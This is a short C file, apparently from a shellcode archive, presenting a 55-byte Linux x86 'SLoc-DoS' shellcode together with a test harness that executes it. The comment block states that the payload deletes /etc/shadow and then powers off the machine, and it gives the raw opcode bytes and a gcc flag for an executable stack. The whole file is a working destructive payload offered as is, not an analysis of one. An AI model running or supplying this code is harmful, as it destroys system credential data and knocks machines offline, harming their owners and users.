#include <stdio.h>
#include <string.h>

/*
by Magnefikko
14.04.2010
magnefikko@gmail.com
Promhyl Studies :: http://promhyl.oz.pl
Subgroup: #PRekambr
Name: 55 bytes SLoc-DoS shellcode
Platform: Linux x86

unlink("/etc/shadow");
execve("poweroff", 0, 0);

gcc -Wl,-z,execstack filename.c

shellcode:

\xeb\x25\x5b\x31\xc0\x31\xc9\x31\xd2\x89\x43\x0b\xb0\x0a\xcd\x80\xeb\x08\x5b\x89\x53\x08\xb0\x0b\xcd\x80\xe8\xf3\xff\xff\xff\x70\x6f\x77\x65\x72\x6f\x66\x66\xe8\xd6\xff\xff\xff\x2f\x65\x74\x63\x2f\x73\x68\x61\x64\x6f\x77

*/


int main(){
char shell[] =
"\xeb\x25\x5b\x31\xc0\x31\xc9\x31\xd2\x89\x43\x0b\xb0\x0a\xcd\x80\xeb\x08\x5b\x89\x53\x08\xb0\x0b\xcd\x80\xe8\xf3\xff\xff\xff\x70\x6f\x77\x65\x72\x6f\x66\x66\xe8\xd6\xff\xff\xff\x2f\x65\x74\x63\x2f\x73\x68\x61\x64\x6f\x77";
printf("by Magnefikko\nmagnefikko@gmail.com\npromhyl.oz.pl\n\nstrlen(shell)
= %d\n", strlen(shell));
(*(void (*)()) shell)();
}




